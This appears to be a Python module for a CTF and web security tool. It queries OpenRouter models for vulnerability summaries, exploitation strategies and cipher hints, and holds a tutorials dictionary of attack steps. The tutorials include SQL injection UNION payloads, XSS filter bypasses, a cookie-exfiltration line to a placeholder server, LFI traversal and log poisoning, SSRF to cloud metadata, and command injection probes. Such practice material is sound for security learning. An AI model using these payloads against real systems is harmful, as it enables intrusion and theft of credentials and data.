"""AI: OpenRouter — анализ уязвимостей, подсказки по эксплуатации и декодированию."""
import os
import logging
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("websec_ai")

OPENROUTER_MODELS = [
    "z-ai/glm-4.5-air:free",
    "tngtech/tng-r1t-chimera:free",
    "arcee-ai/trinity-mini:free",
    "liquid/lfm-2.5-1.2b-instruct:free",
    "meta-llama/llama-3-8b-instruct:free",
]

OPENROUTER_MODEL_LABELS = {
    "z-ai/glm-4.5-air:free": "GLM 4.5 Air",
    "tngtech/tng-r1t-chimera:free": "TNG Chimera",
    "arcee-ai/trinity-mini:free": "Trinity Mini",
    "liquid/lfm-2.5-1.2b-instruct:free": "LFM 2.5",
    "meta-llama/llama-3-8b-instruct:free": "Llama 3 8B",
}


def get_openrouter_model() -> str:
    return os.environ.get("OPENROUTER_MODEL", "").strip() or OPENROUTER_MODELS[0]


def _call_openrouter(
    system: str,
    user: str,
    temperature: float = 0.3,
    max_tokens: int = 1024,
    model: Optional[str] = None,
) -> Optional[str]:
    api_key = (os.environ.get("OPENROUTER_API_KEY") or "").strip()
    if not api_key:
        return None
    model = (model or get_openrouter_model()) or OPENROUTER_MODELS[0]
    try:
        import requests
        r = requests.post(
            "https://openrouter.ai/api/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://github.com/WebSec-AI",
                "X-Title": "WebSecAI",
            },
            json={
                "model": model,
                "messages": [
                    {"role": "system", "content": system},
                    {"role": "user", "content": user},
                ],
                "temperature": temperature,
                "max_tokens": max_tokens,
            },
            timeout=60,
        )
        if r.status_code == 200:
            data = r.json()
            err = data.get("error")
            if err:
                logger.warning("OpenRouter API error: %s", err.get("message", err))
                return None
            choices = data.get("choices") or []
            if not choices:
                logger.warning("OpenRouter empty choices")
                return None
            msg = choices[0].get("message") or {}
            content = msg.get("content")
            if content is None:
                content = choices[0].get("text")
            if content is not None and str(content).strip():
                return str(content).strip()
            logger.debug("OpenRouter empty content, finish_reason=%s", choices[0].get("finish_reason"))
        else:
            try:
                err_body = r.json()
                err_msg = err_body.get("error", {}).get("message", err_body.get("message", r.text[:300]))
            except Exception:
                err_msg = r.text[:300]
            logger.warning("OpenRouter HTTP %s: %s", r.status_code, err_msg)
    except Exception as e:
        logger.warning("OpenRouter request failed: %s", e)
    return None


def ai_analyze_vulnerabilities(vulnerabilities: List[str]) -> Tuple[str, str]:
    """Return (en, ru) analysis text for list of vulns."""
    if not vulnerabilities:
        return "No vulnerabilities found.", "Уязвимостей не обнаружено."
    vuln_list = ", ".join(vulnerabilities)
    sys_en = "You are a cybersecurity expert. Give a short professional risk summary."
    sys_ru = "Ты эксперт по кибербезопасности. Дай краткое профессиональное резюме рисков."
    user_en = f"Analyze risks for: {vuln_list}"
    user_ru = f"Анализ рисков для: {vuln_list}"
    en = _call_openrouter(sys_en, user_en) or f"Risks detected: {vuln_list}"
    ru = _call_openrouter(sys_ru, user_ru) or f"Обнаружено: {vuln_list}"
    return en, ru


def ai_exploit_hint(vuln_type: str, context: Dict[str, Any]) -> Optional[str]:
    """Ask AI for exploit strategy. context can include: db_type, waf, url, etc."""
    user = f"Vulnerability: {vuln_type}. Context: {context}. Suggest a short exploitation strategy (1-2 paragraphs)."
    return _call_openrouter(
        "You are a CTF and penetration testing expert. Answer concisely.",
        user,
        max_tokens=512,
    )


def ai_decode_hint(cipher_sample: str, encoding_hint: Optional[str] = None) -> Optional[str]:
    """Ask AI to suggest decoding method for a string (base64, hex, ROT13, etc.)."""
    user = f"Sample (first 200 chars): {cipher_sample[:200]}. "
    if encoding_hint:
        user += f"Hint: {encoding_hint}. "
    user += "Suggest decoding method (base64, hex, ROT13, XOR, etc.) and briefly how to try it."
    return _call_openrouter(
        "You are a crypto/forensics expert. Answer in 2-4 short sentences.",
        user,
        max_tokens=256,
    )


def ai_cipher_type(ciphertext: str) -> Optional[str]:
    """Suggest cipher/encoding type from ciphertext sample."""
    sample = ciphertext[:300].replace("\n", " ")
    return _call_openrouter(
        "You are a cryptanalysis expert. Identify likely encoding or cipher type from the sample.",
        f"Sample: {sample}. Reply with only the type (e.g. Base64, Hex, ROT13, AES, etc.).",
        max_tokens=80,
    )


TUTORIALS: Dict[str, Dict[str, Any]] = {
    "sqli": {
        "title": "SQL Injection",
        "steps": [
            "Identify injectable parameter (e.g. ?id=1).",
            "Confirm with ' OR 1=1-- or ' AND 1=1--.",
            "Determine column count: ORDER BY 1,2,3... or UNION SELECT NULL,NULL.",
            "Find injectable columns: UNION SELECT 1,2,3... and see which reflect.",
            "Extract data: UNION SELECT 1,table_name,3 FROM information_schema.tables.",
            "Dump flags: UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flags'.",
        ],
        "practice_lab": "http://testphp.vulnweb.com/listproducts.php?cat=1",
        "video": "https://www.youtube.com/results?search_query=sql+injection+ctf",
    },
    "xss": {
        "title": "Cross-Site Scripting",
        "steps": [
            "Find reflected input (search, form, URL param).",
            "Test with <script>alert(1)</script> or <img src=x onerror=alert(1)>.",
            "Bypass filters: <svg/onload=alert(1)>, encoding, or event handlers.",
            "For stored XSS: inject in comment/profile and trigger on load.",
            "For cookie stealing: document.location='https://yourserver/?c='+document.cookie.",
        ],
        "practice_lab": "http://testphp.vulnweb.com/search.php",
        "video": "https://www.youtube.com/results?search_query=xss+ctf",
    },
    "lfi": {
        "title": "Local File Inclusion",
        "steps": [
            "Find param that might include files (file=, page=, path=).",
            "Try /etc/passwd, ../../../etc/passwd, ....//....//etc/passwd.",
            "Try /flag.txt, /var/www/flag.txt, php://filter/convert.base64-encode/resource=index.php.",
            "Log poisoning: include access log and inject PHP via User-Agent.",
        ],
        "practice_lab": "http://testphp.vulnweb.com/",
        "video": "https://www.youtube.com/results?search_query=lfi+ctf",
    },
    "ssrf": {
        "title": "Server-Side Request Forgery",
        "steps": [
            "Find URL fetcher (webhook, image URL, redirect).",
            "Try http://127.0.0.1/, http://169.254.169.254/ (cloud metadata).",
            "Bypass filters: 127.0.0.1, localhost, 0.0.0.0, DNS rebinding.",
        ],
        "practice_lab": "",
        "video": "https://www.youtube.com/results?search_query=ssrf+ctf",
    },
    "rce": {
        "title": "Command Injection / RCE",
        "steps": [
            "Find param passed to shell (cmd=, exec=, ping=).",
            "Try ; id, | id, $(id), `id`.",
            "Read flag: ; cat /flag.txt or ; cat /root/flag.txt.",
        ],
        "practice_lab": "",
        "video": "https://www.youtube.com/results?search_query=command+injection+ctf",
    },
}


def ai_tutorial_for_vuln(vuln_type: str) -> Dict[str, Any]:
    """Return tutorial (steps + practice_lab) for vulnerability type; optional AI expansion."""
    vt = vuln_type.lower().replace(" ", "_").replace("-", "_")
    if vt in ("sqli", "sql_injection"):
        vt = "sqli"
    elif vt in ("xss",):
        vt = "xss"
    elif vt in ("lfi", "rfi", "path_traversal"):
        vt = "lfi"
    elif vt in ("ssrf",):
        vt = "ssrf"
    elif vt in ("rce", "command_injection", "cmd_injection"):
        vt = "rce"
    else:
        vt = "sqli"
    base = TUTORIALS.get(vt, TUTORIALS["sqli"]).copy()
    extra = _call_openrouter(
        "You are a CTF mentor. Give one short practical hint for this vulnerability type.",
        f"Vulnerability: {base.get('title', vuln_type)}. One sentence hint only.",
        max_tokens=80,
    )
    if extra:
        base["ai_hint"] = extra
    return base
